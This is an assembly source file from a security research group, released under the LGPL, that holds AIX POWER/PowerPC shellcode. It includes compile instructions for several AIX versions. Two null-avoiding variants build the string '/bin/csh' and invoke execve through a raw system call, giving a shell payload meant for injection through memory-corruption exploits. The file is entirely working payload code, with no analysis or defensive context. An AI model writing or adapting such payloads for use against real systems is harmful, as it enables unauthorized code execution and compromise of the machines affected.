/*
 *  $Id: aix-power-shellcode.S 6 2008-09-10 17:27:50Z ramon $
 *
 *  aix-power-shellcode.S - AIX POWER/PowerPC shellcode
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Compile with the following command.
 * $ gcc -Wall -DVERSION -o aix-power-shellcode aix-power-shellcode.S
 *
 * Where VERSION is one of the currently supported AIX versions.
 * -DV41    AIX 4.1
 * -DV42    AIX 4.2
 * -DV43    AIX 4.3
 * -DV4330  AIX 4.3.3.0
 * -DV53    AIX 5.3
 *
 */

#include "aix-power.h"

    .globl .main
    .csect .text[PR]

.main:

#ifndef ALT
shellcode:
    lil     %r31,__CAL
    xor.    %r5,%r5,%r5
    bnel    shellcode
    mflr    %r30
    cal     %r30,511(%r30)
    cal     %r3,-475(%r30)
    stu     %r5,-4(%r1)
    stu     %r3,-4(%r1)
    mr      %r4,%r1
    cal     %r2,__NC_execve(%r31)
    crorc   %cr6,%cr6,%cr6
    .long   0x44ffff02
    .asciz  "/bin/csh"

#else
_shellcode:
    xor     %r5,%r5,%r5
    liu     %r31,0x2f63
    oril    %r31,%r31,0x7368
    liu     %r30,0x2f62
    oril    %r30,%r30,0x696e
    stu     %r5,-4(%r1)
    stu     %r31,-4(%r1)
    stu     %r30,-4(%r1)
    mr      %r3,%r1
    stu     %r5,-4(%r1)
    stu     %r3,-4(%r1)
    mr      %r4,%r1
    lil     %r2,__CAL
    cal     %r2,__NC_execve(%r2)
    crorc   %cr6,%cr6,%cr6
    .long   0x44ffff02

#endif

